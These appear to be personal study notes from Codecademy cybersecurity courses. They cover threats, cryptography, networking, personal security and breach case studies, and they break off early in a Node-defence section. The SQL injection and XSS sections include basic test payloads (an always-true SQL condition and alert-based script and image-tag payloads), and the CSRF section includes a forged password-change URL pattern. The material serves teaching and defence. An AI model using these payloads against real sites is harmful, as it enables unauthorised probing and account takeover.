# Cybersecurity

## Table of contents
- [Codecademy course - Introduction to Cybersecurity](#Codecademy-course---Introduction-to-Cybersecurity)
  - [Definition](#Definition)
  - [Subsets](#Subsets)
  - [History](#History)
  - [Regulations](#Regulations)
  - [Cyber Threats](#Cyber-Threats)
    - [Malware](#Malware)
    - [Phishing](#Phishing)
    - [SQL Injection](#SQL-Injection)
    - [XSS](#XSS)
    - [CSRF](#CSRF)
    - [Zero-day](#Zero-day)
    - [DDoS](#DDoS)
  - [Cryptography](#Cryptography)
  - [Authentification and authorization](#Authentification-and-authorization)
  - [Network security](#Network-security)
    - [Network basics](#Network-basics)
    - [Firewalls](#Firewalls)
    - [Wireless Network Security](#Wireless-Network-Security)
    - [Network monitoring](#Network-monitoring)
  - [Personal security](#Personal-security)
  - [Case studies](#Case-studies)
  - [Looking ahead](#Looking-ahead)
- [Codecademy course - Defending Node Applications from SQL Injection, XSS and CSRF Attacks](#codecademy-course---defending-node-applications-from-sql-injection-xss-and-csrf-attacks)
  - [CSRF Attacks](#CSRF-Attacks)
  - [SQL Attacks](#SQL-Attacks) 
  - [XSS Attacks](#XSS-Attacks)
  - [CORS](#CORS)
  - [Javascript Defensive coding](#Javascript-Defensive-coding)
  - [Secure your nodejs application Summary](#Secure-your-nodejs-application-Summary)
- [Codecademy course - Cybersecurity for Business](#Codecademy-course---Cybersecurity-for-Business)
  - [Cybersecurity team](#Cybersecurity-team)
  - [Employee safety](#Employee-safety)
    - [Account policies](#Account-policies) 
    - [Security awareness training](#Security-awareness-training)
  - [Third-party risk management](#Third-party-risk-management)
  - [Incident response playbook](#Incident-response-playbook)
- [Free tutorials](#Free-tutorials)
  - [Other concepts](#Other-concepts)
    - [Hacking and ethical hacking](#Hacking-and-ethical-hacking)
- [Resources](#Resources)

## Codecademy course - Introduction to Cybersecurity
### Definition
Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks.<br>
Digital attacks for example could consist of stealing data from a database such as credit card information, sending fraudulent emails asking for money, shutdown a website or use digital tools in a fraudulent way.<br>

The CIA Triad stands for confidentiality, integrity and availability and is a comprehensive model for cybersecurity.

#### Confidentiality
Refers to the protection of private data.<br>
This can be done through: permission rights, data encryption, multi-factor authentification.

#### Integrity
Refers to data integrity, meaning data should be protected from malignant change or deletion.<br>
This can be done through: keeping data backups, using cryptography to securely check for changes, keeping track of digital signatures to prove integrity of data.

#### Availability
Refers to data being reliably available for those authorized.<br>
This can be done through: constant monitoring of servers and networks, maintaining hardware and software.

### Subsets
Forms of security:
* Information security (InfoSec), protects data from unauthorized users.
* Network security, is concerned with the network infrastructure of an organization that guards against unauthorized access or data from being intercepted.
* Application security refers to measures that defend applications (web, desktop or mobile) such as secure coding, antivirus programs.
* Cloud security refers to the new field which assures resources uploaded to the cloud are secure.
* Cryptography consists of encrypting and decrypting data for it to be unreadable or readable to prevent unauthorized users of accessing data.
* Critical infrastructure security consists of protecting hardware.

Laws affecting cybersecurity exist, applications must be compliant with local applicable laws.

Threat intelligence is the continuous gathering of knowledge of possible attacks.

Security operations consist of a team who is responsible for security by monitoring incidents and recovering from disasters.<br>

Cybercrime is, generally speaking, any crime that makes use of or targets a computer. Different types exist:
* Extortion consists of taking control of software and demand payment such as with ransomware.
* Fraud is a broad category including identity theft, scams, phishing.
* Theft consists of stealing data or theft of services and resources consists of for example using other people's computers to mine cryptocurrency.

### History
Cybersecurity developed as a distinct field throughout the 1960s and 70s and exploded into the public consciousness in the late 1980s, after a series of events that highlighted just how dangerous a lack of security could be.<br>
Continuing to grow throughout the 90s, cybersecurity is now a core part of modern life.

In the 70s the creation of ARPANET, the earliest form of the internet, gave hackers a lot to think about and explore.<br>
A 1975 paper titled 'The Protection of Information in Computer Systems' presented principles and concepts that would become critical to cybersecurity in the future.<br>

The Internet was formed in 1983. The late 80’s gave two major events, the first was the discovery that a hacker working for the KGB gained access to sensitive documents from the U.S. military.<br>
The second was the creation of the world’s truly serious piece of malware: the Morris Worm. It was originally written to map the size of the internet but quickly grew out of control, choking computers with multiple copies of itself, and clogging the network as it kept replicating.<br>

The 1990s are widely considered to be the era of viruses. Computers that connected to the internet became more common in households.<br>
The unfocused, scattered attacks of the era led to the rise of the anti-malware industry. Cybersecurity, as a whole, started to be taken much more seriously.

In the 2000's hundreds of millions of sets of credit card data were breached. The threats of data breaches and ransomware attacks forced large businesses to improve their cybersecurity programs.

During the 2010s, the scale of threats continued to grow. The most dangerous of these new threat actors are known as APTs: Advanced Persistent Threats. APTs are capable of running entire cyber-campaigns, attempting to infiltrate their target across multiple domains simultaneously.<br>

### Regulations
Regulations are sets of standards that organizations must follow, generally due to legal obligation, and define the responsibilities organizations have.

Digital Forensics is the process of gathering the evidence of a cybercrime in a way that the evidence can be used in a court of law.

The Computer Fraud and Abuse Act (CFAA) is a US law that is used to prosecute cybercrime.

The Health Insurance Portability and Accountability Act (HIPAA) is a U.S. federal law designed to modernize various aspects of healthcare and insurance. More importantly for cybersecurity, it introduced regulations and standards requiring entities that handle Protected Health Information (PHI) to ensure its security and privacy.

The Gramm-Leach-Bliley Act (GLBA) is a U.S. federal law governing financial institutions, requiring them to protect sensitive customer information, and disclose how they share that information.

The Payment Card Industry Data Security Standard (PCI DSS, or PCI for short) is a regulation developed by credit card companies and governing merchants that handle credit card data.

### Cyber Threats

#### Malware
Malware is malicious hardware, firmware, or software inserted into a system to cause damage or gain unauthorized access to a network.<br>

Adware is unwanted software designed to throw advertisements on your screen.

A virus is a malicious self-replacing application that attaches itself to other programs and executables without the permission of the user. It’s possible a downloaded virus could alter or delete data on the computer.

A worm is self-replicating code that copies itself from computer to computer without user intervention. The worm could also replicate so much that it overloads your client’s system.

Spyware is malicious code downloaded without a user’s authorization which is used to steal sensitive information and relay it to an outside party in a way that harms the original user. If the spyware contained a keylogger, a program that can record what a victim types into their computer, a threat actor could potentially gain access to sensitive information.

Trojans are a type of contained, non-replicating malware that disguises itself as legitimate software in order to allow scammers and hackers access to a user’s system.<br>
Be wary of untrustworthy disk computer cleaners and antivirus software pretending to be trustworthy.

Rootkits are a collection of malicious programs that secretly provide continued, privileged access to a system for an unauthorized user. A rootkit can create a backdoor on a computer to let a hacker in.<br>
A trojan horse can for example be used to let a rootkit in.

Ransomware consists of the malicious actors blocking access to data or threaten to publish the sensitive data unless the client pays them money. Ransomware is one of the largest cybersecurity threats facing industries today. 

Fileless malware is a type of malware that ‘lives off the land’ and uses legitimate tools and the user’s operating system to perform malicious activities like privilege escalation, data collection, and more. It’s incredibly hard to detect and almost always missed by antivirus software.<br>
Unlike a Trojan Horse, fileless malware is not pretending to be legitimate software, it actually is a part of legitimate software. Fileless malware hides itself within the code of legitimate software, often altering existing code to make it malicious.

To prevent malware do not click on strange links or download untrustworthy files, do not interact with suspicious emails, use a trustworthy antivirus software, disable unused applications and regularly update applications.<br>
To detect certain malware, monitor the computer for any unexpected changes, such as is it slower than usual, is there less hard drive space than expected, have files mysteriously appeared or disappeared?<br>
To revert from certain malware, backup important data and re-image it, reboot computer.

#### Phishing
The practice of tricking humans to get important data or access is also known as social engineering. Doing this through computers, often through email, is called phishing.

Vishing or voice phishing refers to spam calls trying to extract sensitive information.<br>
Smishing or SMS phishing, is phishing not done via email but via text messages.

Phishing is usually performed to the masses, but when it is prepared and personalized for one particular individual it is called spear phishing. If this individual is high profile this is called whaling. 

Often the goal of phishing is to incite a victim to send money, payment information, other sensitive data to the attacker or install malware.

Email spoofing refers to when an attacker falsifies their email headers to make it appear as though the email is coming from someone else.<br>
Still it is possible to view the actual email address used to send the mail and this is a good way of detecting phishing.

Webpages that harvest credentials are especially effective phishing tools. Because these pages often forward victims to a legitimate webpage after stealing their login information, the user never realizes they were phished. These webpages can also encourage you to download malware unknowingly.

#### SQL Injection
In apps containing a database, SQL injections consists of writing SQL code inside inputs, if this input is subsequently used inside an SQL database query, access is given to the database to unauthorized users.

The SQL injection vulnerability only affects databases that use SQL as their language. This, however, does not mean MongoDB or NoSQL databases are not at risk since they are also prone to their own vulnerabilities and injection attacks.

A union-based injection leverages the power of the SQL keyword UNION. UNION allows us to take two separate SELECT queries and combine their results.<br>

In an error-based injection, an attacker writes a SQL query to force the application to return an error message with sensitive data.

Boolean-based injections involve SQL statements that can confirm TRUE/FALSE questions about the database. A classic example is writing in a search input `1 OR '1'='1'` as this will always equal to true the database will return all values that could be searched.

A time-based injection makes use of several built in SQL functions, such as SLEEP() and BENCHMARK(), to cause visible delays in an application’s response time. This can be useful when you’re unable to get visible output and want a true/false response.

Unlike the other methods, which return the results via the web application, an out-of-band injection will leverage a new channel to retrieve information from a query.<br>
Generally, these SQL injections will cause the database server to send HTTP or DNS requests containing SQL query results to an attacker-controlled server. From there, the attacker could review the log files to identify the query results.<br>
These injections are extremely difficult to execute, because they rely on permissions to database functions that are most often disabled, and would have to bypass firewalls that might stop requests to the attacker’s server.

There are two main methods for preventing injection attacks:
* Sanitization is the process of removing dangerous characters from user input. Usually a programming language should have its own function for sanitization of inputs.
* Prepared statements also called parameterized queries is the most reliable way of protecting from SQL injections. It uses SQL query templates, which contains parameters that will never be considered SQL code.

#### XSS
Cross-Site Scripting (XSS) is a common web application vulnerability that occurs when a web application returns unsanitized input to the frontend of an application.<br>
An example of a place for this type of attack would be a comment section, your comment is accepted as input and displayed on frontend afterwards.<br>
In a XSS attack, an attacker takes advantage of this vulnerability by inputting malicious code, generally in the form of JavaScript, through the browser.

A stored XSS vulnerability occurs when a web server saves an attacker’s input into its datastores. Saved inputs can be returned to numerous victims.

Reflected XSS occurs when a user’s input is immediately returned back to the user. This return may come in the form of an error message or a popup. In these instances, the payload is never stored by the server.<br>
Rather, it exists as a value in the URL or request. Through phishing, an attacker could spread this transformed URL of a legitimate site to unsuspecting victims leading to execution of malicious scripts.

DOM-based XSS consists of an attacker injecting arbitrary code through the DOM. This type of attack is completely client-side.<br>
For example, a web page may use client-side Javascript to customize a welcome page, displaying their name based on a value in the URL. Depending on how the javascript runs, an attacker may be able to replace the name value with a malicious script.

How to identify XSS vulnerabilities?<br>
When looking at the application, consider all possible fields. Comments, usernames, custom settings, and parameters all provide great starting points.<br>
Once we have identified a potential injection point, we can begin testing various inputs to create a proof-of-concept payload (POC). A POC payload will demonstrate that an issue exists, without causing damage.<br>
The most basic POC payload is `<script>alert(1);</script>`. If this does not work other ways without script tags may work such as `<img src="X" onerror=alert(1);>`.

Similar to SQL injections, XSS is preventable with both application-level firewalls and sanitization.<br>
Sanitization is the process of removing/replacing problematic characters with safe versions. Depending on the backend language, there may or may not be built in functions to aid in this process.

#### CSRF
Cross-Site Request Forgery (CSRF) is a common class of vulnerability that tricks a user into submitting a web request on behalf of an attacker.

In many cases of CSRF, a malicious actor crafts a URL by changing query parameter values and uses clever tricks like link shortening or embedding it into a phishing email to get an authenticated user to click on it. Because the user is automatically authenticated through cookies the URL will be authorized to perform an action on the user's account. 

Suppose our web application allows users to change their password via the following link(`https://oursite.com/changepassword.php?new_password=[USER PASSWORD]`), where [USER PASSWORD] would contain the new desired password. If the developers didn’t consider the impact of Cross-Site Request Forgery attacks, a threat actor may be able to create a new password link and send it to the user. When the user opens the link, they would initiate the password change, but with the attacker-supplied password. This would allow a hacker to take over their account.

One of the simplest ways to prevent these attacks is to add a CSRF token. This token is a unique value that is added to each request. This value is dynamically generated by the server and used to verify all requests. It basically makes crafting URLs impossible because hand-made URLs will lack the random CSRF token.<br>
While a CSRF token can prevent many malicious requests, it can still fail. If an application is vulnerable to XSS a hacker could use their XSS attack to extract this token.<br>
A solution is to ask the user for the user's password before commiting a profile change.

#### Zero-day
A “zero-day” (also called “0-day”) vulnerability is a newly-discovered software bug that a developer was not aware of before the software was released.<br>
Therefore, after it is discovered, the developer has “zero” days to patch it before it can be exploited. When a “zero-day attack” occurs, the vulnerability quickly becomes known and is patched by the developer.

The vast majority of cyber attacks exploit existing vulnerabilities and thus are not 0-day vulnerabilities. These vulnerabilities are catalogued and numbered as CVEs, or “Common Vulnerabilities and Exposures” and are maintained in places like the Mitre Corporation’s database or the National Vulnerability Database (NVD).<br>
Thousands of CVEs are recorded every year and are typically found first by either security companies or researchers participating in companies’ bug bounty programs. Bug bounty programs offer money (a bounty) to anyone able to find a vulnerability in their systems.

#### DDoS
DDoS stands for Distributed Denial of Service. A DDoS attack is when an attacker attempts to make a resource, such as a website’s various servers, go offline by overwhelming it with web traffic.<br>
This is done by making requests to a server with large amounts of computers.

Botnets are “robot networks” made up of computers infected by malware. These botnets can be made up of millions of bots, and can even include IoT devices. A single attacker can spread malware to many devices, and then use all of those devices in concert to act together, oftentimes without the victims ever knowing that their devices are infected.<br>
Because botnet services can be rented out to other cybercriminals for specific attacks, anyone with the money to rent a botnet can carry out a DDoS attack, leveraging the power of millions of computers, making DDoS attacks ever more powerful.

There are a number of ways that websites try to guard against DDoS attacks, for example, by rate-limiting: limiting the number of requests a server will accept in a single time. CAPTCHAs can also provide some protection. Theoretically, a CAPTCHA can determine whether a user is a human or a “bot”, allowing legitimate web traffic to attempt to log in while blocking malicious automated traffic.<br>
In general, it is difficult to guard against DDoS attacks. This is why websites seek protection from organizations such as Cloudflare, which provides protection against DDoS attacks by sitting between the server and the client, and forwarding legitimate traffic to the server while hiding malicious traffic.

### Cryptography
**Encryption**<br>
Cryptography is the science of hiding data and making it available again.<br>

In cryptography, hiding data is called encryption and unhiding it is called decryption.<br>
When data is securely exchanged, it is first encrypted by the sender, and then decrypted by the receiver using a special key.

'https' that comes before many domain names indicates that encryption is being used to exchange data between the browser and the server.

Symmetric encryption uses the same key to both encrypt and decrypt data while asymmetric encryption uses two different keys to encrypt and decrypt data.<br>
Asymmetric encryption is the most secure way to transmit data, however, it is slower and more complex than symmetric encryption.<br>
Asymmetric encryption contrary to symmetric encryption contains a key pair, made up of a public key and a private key.<br>
The public key is only used to encrypt while the private key is used to decrypt and must be kept secret.<br>
For example, if you want to receive an encrypted message from someone, you would first generate a key pair and give them the public key. Then, they would write a message and encrypt it using the public key you gave them. Finally, they would send you the message and you would decrypt it with your private key.<br>
Having a private key you do not share makes it impossible for others to intercept and read messages.<br>

**Hashing**<br>
Hashing is a key application of cryptography. A cybersecurity professional uses hashing algorithms to compare files big and small, as well as to protect data.

Unlike the methods we’ve already looked at, which are designed to both encrypt and decrypt data, hashing is different. Hashing does not encrypt data. Instead, hashing is a one-way process that takes a piece of data of any size and uses a mathematical function to represent that data with a unique hash value of a fixed size. You cannot compute the original data from its hash.<br>
Although you cannot revert a hash to its initial value, you can compare the hash of a value with the hash of another value.<br>

Because each hash should be unique, hashing allows us to see if changes have been made to documents. By comparing hashes of files we can quickly see if changes have been made to a file.

A hash collision is when different values end up equating the same hash.<br>
While theoretically possible it is so rare with the modern hashing algorithm SHA-256 that it does not happen in practice, however, older hashing algorithms such as MD5 and SHA-1 are more likely to result in a hash collision.

Hashes are often used to store passwords in databases.<br>
This prevents passwords from being readable during data-breaches and this can be done because passwords never need to be displayed, comparing password hashes is sufficient.

Rainbow tables are tables used by hackers to compare password hashes from a data-breach with hashes from commonly used passwords with the goal of unfolding the actual passwords.<br>
Using complex passwords prevents this from working plus hashed passwords can be further protected using salts.<br>
Salts protect against rainbow tables by adding to the password before hashing a secret random string.

### Authentification and authorization
Authentication is the verification of who you are and Authorization is the verification of what you have the right to do.<br>
Authentication and authorization go hand in hand. Users must be authenticated before carrying out the activity they are authorized to perform.<br>
Role-based access is exactly what it sounds like: you have permissions to access certain things (authorization) based on your role/responsibilities (authentication).

Single-Factor authentication refers to when only one form of authentication is used.<br>
Multi-Factor Authentication (MFA) is the use of multiple types of authentication in order to access a single resource. The most common form of Multi-Factor Authentication is Two-Factor Authentication (2FA). For example, if you log into your bank’s website with a username and password, and then receive a text message with a One-Time Passcode (OTP) that you also need to enter to gain access to your bank account.<br>
MFA is far more secure than Single-Factor Authentication and should always be used with important accounts such as your bank.<br>
Nevertheless, MFA is still vulnerable to certain kinds of attacks such as SIM Swapping, a phishing attack in which an attacker remotely steals a victim’s telephone number to receive a text-based OTP.

HTTP Basic Auth is the oldest (since 1999) and simplest method of authentication. It simply requires you to send your username and password every time you communicate with the web page. The reason this isn’t necessary when you use your browser is because of something called cookies. Cookies store your credentials so that you don’t need to send them every time you click on a button.

API Keys are similar to HTTP Basic Auth except, instead of a username and password, you use something called an API token. An API token is a unique string of letters and numbers generated for each user.<br>
Unfortunately, API Keys are too long and complex to be practical for everyday users to use them to log in, and like the credentials used in HTTP Basic Auth, they are vulnerable to interception when they are submitted for authentication.

Sometimes we don’t even have to create a username and password for a new account. Instead, we can sign in with Google, LinkedIn, Twitter, and more. This is possible because of OAuth.<br>
By using OAuth someone can connect through another application, this external application will send back user data to initial application after asking for it.<br>
OAuth tokens are great at defending users against data breaches since they eliminate the need to store passwords. However OAuth can be used by malicious applications to demand access to a lot of data from the external application.

### Network security
#### Network basics
A network is two or more computers or devices that are linked in order to share information. Network security consists of keeping exchange within a network secure.<br>
Our computers and devices are able to communicate due to a large set of standards, much like we have road systems and traffic protocols when we drive a car.

Network types:
* A Local Area Network (LAN) is a smaller network that connects multiple devices in a limited area.<br>
* A Campus Area Network (CAN) connects multiple computers and devices over a slightly larger area. In many cases, these types of networks will connect multiple buildings located in the same vicinity. You may see these networks in a university where multiple buildings and outdoor spaces provide students with network access.
* A Wide Area Network (WAN) connects multiple computers over a geographically large area. Large, international organizations may operate these types of networks. Since we’re all connected to the Internet, the whole Internet can technically be classified as a WAN.

The OSI (Open Systems Interconnection) Model was developed in the 1970s and 1980s, and it is a conceptual model that breaks networking into seven separate layers. The layers start from physical signals all the way up to the web applications we interact with. Each layer generally only interacts with the layer below it and provides useful tools or information to the layer above it. OSI is used to help us categorize network processes so we can communicate about them during troubleshooting and while improving security.

OSI layers:
1. Physical - This layer includes the hardware part of modems, adapters, and repeaters next to how unstructured data, like bits, is transmitted. Signals are transferred over wires, WiFi, Bluetooth, the raw data bits are received as a stream of 0s and 1s.
2. Data Link - Covers how data is sent from device to device when they are connected on the same local network. It structures incoming or outgoing data bits into dataframes, manages those dataframes and physical addresses of devices also called Media Access Control (MAC), a switch routes dataframes to correct MAC.
3. Network - Describes how data packets are routed between wider networks such as the Internet. Whereas a data frame at the data link layer travels to local MAC addresses, a data packet at the network layer is routed from a source IP (Internet Protocol) address to a destination IP address.
4. Transport - Refers to how data is actually transferred. Let’s say you wanted to upload a photo from your phone onto social media. The transport layer handles how the image data from that photo is split (segmentation), the rate at which the packets are sent, and how errors are handled if data packets don’t make it to the site’s server. The most common transport protocols on the Internet are TCP (Transmission Control Protocol) and UDP (User Datagram Protocol). TCP is a connection-oriented protocol, where a more rigorous acknowledgment between sender and receiver must happen before any data can be sent. This protocol also includes flow control and error recovery, and it is used when larger amounts of data need to be sent and timing is less of a concern. UDP is a more lightweight protocol that does not require a fixed channel between a sender and receiver. It is often used when the amount of data sent is piecemeal and needs to be transmitted quickly such as during video.
5. Session - When two computers or devices have started an exchange of information, we call that a session. The Session layer in OSI is responsible for opening, closing, and maintaining sessions. It contains authentication and authorization measures at session opening and safeguards in case a connection drops.
6. Presentation - This layer includes all the functions that convert data from unusable to usable by an application, such as encryption, decryption, file compression, file decompression.
7. Application - Includes websites, browsers, email, mobile applications, and how they render Internet data so that we can interact with it.

Next to the OSI model, the TCP/IP model is a shorter model describing networking that makes direct reference to its foundational protocols TCP and IP.<br>
The four layers of TCP/IP are as follows:
1. Network access - Also called the link layer, encompasses OSI layer 1, 2 and refers to the sending and receiving of network data at the local network level.
2. Internet - Similarly as 'OSI Network layer' is where routing and IP addressing occurs.
3. Transport - Refers to TCP and thus not UDP protocol. 
4. Application - Encompasses OSI layer 5,6,7 and includes opening and closing of sessions, translating data, and the interaction with content at application level. 

Network protocols are a set of standards for devices interacting on the internet. Cyber attacks can abuse protocol standards at application level to gain access to sensitive information.<br>
Here are important protocols at TCP/IP application layer:
* Domain Name System (DNS) - converts domain names to IP addresses.
* HTTP (The Hyper Text Transfer Protocol) - Handles web requests to servers such as GET, POST, PUT, HEAD to retrieve and send data.
* IMAP, POP, and SMTP - To send email, the standard is SMTP (Simple Mail Transfer Protocol). IMAP (Internet Message Access Protocol) and POP (Post Office Protocol) allow users to access emails stored on a remote web server. In IMAP, servers store your email and return copies to you, allowing you to access the same email on multiple devices. In POP3 (POP version 3), however, emails are generally downloaded from the server onto just a single device.
* Secure Shell (SSH) - Is used to access a remote terminal or virtual machine (VM) over a secure connection. For example, accessing github from the command line uses SSH.
* File Transfer Protocol (FTP) - Is used to transfer files from one system to another.
* Server Message Block (SMB) - Allows multiple users to interact with a remote system like a file share. Multiple people can view and modify shared resources in a centralized server.

Data-packets get routed from the transport layer to those network protocols, specific numbers called ports are reserved so that packets for different network protocols can come in at the same time. Think of ports as lanes for network traffic.

#### Firewalls
A firewall is a tool designed to intercept and assess incoming and outgoing packets.<br>
We can set rules for a firewall to either accept or deny a packet in the network. Those rules can be based on the source IP address of a packet, the details of a network session, or the contents of a packet.

Packet-filtering firewalls are the simplest of all firewalls, they do not verify content, they only filter on source IP, destination IP, destination port numbers on a packet. They are usually only used within an organization to prevent the flow of packets between different parts of the network.

Circuit-level firewalls ensures legitimate connections and properly configured sessions. Those prevent malformed sessions from connecting, but can still allow certain threats to pass through, as such it is usually used together with other more advanced firewalls.

Stateful inspection firewalls have the capabilities of packet-filtering and circuit-level firewalls plus they offer the additional protection of dropping unexpected packets.

Application firewalls offer robust security, using pattern-matching, they can recognize potential attacks inside HTTP requests and block those.

Next-generation level firewalls are the most advanced, they encompass all the capabilities of prior firewalls plus identification of additional malicious content. To identify malicious content it may use AI and thus is complex with a higher operating cost.

#### Wireless Network Security
With Wi-Fi, users have experienced an increase in device freedom, but wireless technology carries the risk that we may not physically see who is accessing a network.

Network Segmentation is the basic practice of breaking apart larger networks into smaller, functionally similar networks with different access levels. This improves both security and performance.<br>
When segmenting networks we can consider who can access which network and use different firewalls on different segmented networks.

Access points are the systems and nodes used to distribute wireless signals. It is important we consider both the placement and strength of our access points.<br>
This risk is especially true in places like coffee shops or libraries. It would not be very wise to keep the router in plain sight so that anyone could physically configure it.

All wireless activity should be securely encrypted. Currently, the accepted standard for security is WPA2. WPA2-Personal will require a single password to access Wi-Fi, while WPA2-Enterprise will require multi-factor authentication.<br>
It’s recommended to set your own network name and password when you set up your wireless Internet at home.

#### Network monitoring
By analyzing network activity, sensitive information or malicious activity can be found.

The software wireshark can be used to analyze network activity.<br>
The key when trying to analyze network activity is filtering out noise.<br>
ARP, also known as Address Resolution Protocol, is used to translate MAC addresses to IP addresses. To only see ARP traffic use the bar labeled 'Apply a display filter', enter 'arp'.<br>
To see DNS requests, enter 'dns' in the bar labeled 'Apply a display filter'.<br>
Other filters are 'http' or more specific filters such as 'tcp.port == 80'.

### Personal security
Today, there are common methods to guess passwords in a variety of ways, such as brute-forcing, credential stuffing, dictionary attacks, and rainbow tables.<br>
The more characters, different capitalizations, special symbols a password has, the harder it is to “brute-force”.<br>
Avoid using same password on different websites. By some metrics, 30,000 websites are hacked every day. When people hack into the website of a small company and steal the usernames and passwords of users, they are then able to use freely available credential stuffing tools to automatically try those username and password combinations across thousands of other sites.<br>
A password manager is software that usually comes in a browser extension form, and it stores all of your passwords in encrypted form so that you don’t have to remember all of them individually. Instead, you only have to remember one master password.<br>
Make sure you use two-factor authentication (2FA) and multi-factor authentication (MFA) wherever and whenever possible. At the very least, 2FA should be enabled for high-value accounts such as your bank account.Tools like the Google Authenticator App or YubiKey make code-based MFA more convenient.<br>

Virtual Private Networks (VPNs) make you anonimous while browsing the web by constantly changing your IP address.<br>
Your internet service provider (ISP) can see everything you do on the internet and even sell that data if you are not using a VPN. People you interact with on internet through your IP address can find your location besides if you use a VPN.<br>
VPNs also add security, they can protect you from Man-In-The-Middle (MITM) Attacks, in which network traffic is intercepted by a malicious third party. When you use a VPN, it creates an encrypted tunnel between you and a remote server operated by your VPN provider. That prevents your ISP, others on your WiFi network, and websites from seeing what you’re doing. So, if you log on a suspicious public WiFi network with a VPN turned on, you don’t have to worry about your username and password being stolen.<br>
Additionaly It can give you an IP address from another country, affecting how websites treat you, such as Netflix that proposes different content depending on IP location.

Just as VPN encryption keeps you safe from eavesdroppers, the encryption provided by certain messaging apps such as Signal, or email providers such as Protonmail or Tutanota can also help to keep you secure. What makes these services different from more widely known competitors is that all of them offer end-to-end encryption. Essentially, using encrypted communication platforms both protects your data from being taken and prevents companies from collecting data from your messages for marketing purposes.

Some browsers are more secure than others. For example, some browsers may update frequently but allow third parties to track you, whereas others may have the opposite problem. However, no matter what browser you are using, by always running the latest software available to you, you ensure that you are protected from the vast majority of attacks.<br>
DuckDuckGo is an internet search engine that emphasizes protecting searchers' privacy and avoiding the filter bubble of personalized search results. Unlike Google DuckDcukGo doesn´t track your browser history and sell it online for advertising.

Make sure that you are running the current version of your browser and operating system. Make sure to download new updates on your devices as well, since they often release specific patches for vulnerabilities.

Making sure you know how to spot phishing(don't trust unknown people), malware(don't download untrustworthy programs or click on suspicious links) and other social engineering attacks is as important as keeping your systems secure.

Hardening is the process of fortifying a system against attacks. When we harden computers, we are generally focused on fortifying the operating system, making sure that it is as secure as it can be.<br>
Operating systems (OS for short) are pre-loaded sets of software that handle the details of keeping a computer running, provide services to applications, and make it easy for us to interact with our computers through a graphical user interface.<br>
Hardening is a balancing act: too little of it, and the computer is vulnerable to attacks, but too much hardening can make a computer impractical to use. For example, keeping a computer off is a sure-fire way to prevent it from being remotely compromised, but also dramatically decreases its usability.<br>
No matter what OS you use, there are some shared practices between different types of devices. Some examples of shared practices might be: Requiring Account Passwords, Limiting Administrator Access, Utilizing Firewalls, Using a Trustworthy Antivirus Software, Keeping Your System Up-to-Date.<br>
There are other security practices that will differ based on the type of device you use. Many Windows processes will be unique to Windows machines. Linux and Mac OS might share some processes because the Mac terminal is similar to the terminal on Linux machines.<br>
For more info see [Windows hardening](https://www.codecademy.com/courses/introduction-to-cybersecurity/articles/windows-hardening) and [Linux hardening](https://www.codecademy.com/courses/introduction-to-cybersecurity/articles/linux-hardening).

### Case studies
#### Breach 1: Uber
In late 2016, attackers used a password obtained in an unrelated data breach to gain access to an Uber engineer’s personal GitHub account. From this account, the attackers were able to access one of Uber’s internal repositories, which contained a private key used to access Uber’s datastores. These datastores contained unencrypted personal information for approximately 57 million Uber drivers and riders. The attackers downloaded copies of this private user information violating the information’s confidentiality. The attackers then contacted Uber, informed them that they had compromised Uber’s databases, and demanded a ransom to delete the stolen data.<br>
Uber was contacted by the attackers on November 14th, 2016, and Uber chose to pay the ransom. Uber had the attackers sign non-disclosure agreements regarding the stolen information.<br>
Uber didn’t disclose the breach until November 21, 2017, following the appointment of a new CEO. In addition to being highly unethical, Uber’s failure to disclose the breach was also illegal. In addition to the $100,000 ransom, Uber paid $148 million as part of the settlement.

Learnings:
* Failing to disclose breaches is unethical and illegal.
* Mistakenly including keys or other sensitive data in source-control repositories is a common mistake with potentially serious repercussions.
* Internal resources should be accessed using work accounts with strong security policies.
* Don’t store private user information in an unencrypted format.

#### Breach 2: Target
In late November of 2013, attackers gained access to Target’s internal network using credentials stolen from a third-party vendor with network access. Improper network segmentation let the attackers gain access to Target’s point-of-sale (POS) system, which they installed malware onto. This malware stole the details of over 40 million credit cards used at Target’s stores, along with the personal information of over 70 million people. Target had antimalware software monitoring their system, but it was improperly monitored and configured. The software was not able to automatically remove the malware, and the alerts it raised went uninvestigated.<br>
Target invested 100 million dollars into improving its cybersecurity and paid out an additional 18.5 million dollars in settlement costs.

#### Breach 3: SolarWinds
In September of 2019, a group of hackers covertly gained access to SolarWinds, a company that develops enterprise IT and cybersecurity software. The attackers tested and deployed Sunspot, a piece of custom malware, targeting Orion, one of SolarWinds’ products. Sunspot secretly added a backdoor to Orion, which was then digitally signed by SolarWinds’ update system which made it appear legitimate and pushed to customers through software updates. The backdoor allowed the attackers to install additional malware, known as Teardrop, onto the networks of SolarWinds customers, causing a massive breach of confidentiality and integrity.<br>
SolarWinds did not become aware of the attack until December of 2020 when FireEye, another cybersecurity company, discovered the backdoor while investigating how they themselves had been breached. In the ensuing investigation, it was determined that the attackers had used the backdoor to attack approximately 100 companies including Boeing and 9 federal agencies, including the United States Department of Defense and Justice Department. The attack has been publicly attributed to Russia by multiple United States government organizations, including the FBI and NSA. This attack is one of the largest and most serious cases of cyber-espionage in history.

### Looking ahead
#### Cloud
Cloud computing is now an essential solution to the question of scaling as the demand grows for remote collaboration and distributing data quicker to more places.<br>
The benefits of the cloud are that an organization’s data is centralized, the capacity for storage and content delivery is more flexible, and the physical management of the server is outsourced while improving reliability.<br>
Cloud security depends on shared responsibility between the cloud provider and an organization using the cloud (customer).<br>
Provider Side: protecting and configuring the physical infrastructure, improving cloud network architecture, and ensuring the reliability of content delivery.<br>
Customer Side: implementing access control, encryption of assets stored in the cloud, and ensuring compliance.

#### 5G
5G stands for the 5th Generation of standards for telecommunications. Like every new generation, connections between devices will become faster and more reliable. This will allow the evolution of other technologies relying on fast telecommunication such as AIs and automation of certain industries. 

New technology means new security risks. As 5G was built out, new security controls were also introduced. These include new authentication mechanisms, enhanced mobile security, more advanced encryption of communication, and even the possible elimination of physical SIM cards.

#### IoT
Internet of things are objects connected to the internet such as voice-activated speakers, home assistants.

An attacker who can access your IoT devices can use the data those devices store for malicious purposes. They can also hijack these devices to use them as part of a botnet. IoT security is becoming more and more important.

#### AI
Using artificial intelligence, computers can process data relevant to security or threat intelligence at incredibly large volumes. These insights can then be used towards automating complex security actions.<br>
On the other hand, AI is also available to attackers who can collect and gain insights about a target and figure out the most opportune vector or time to attack.

## Codecademy course - Defending Node Applications from SQL Injection, XSS and CSRF Attacks
### CSRF Attacks
[CSRF introduction](#CSRF)

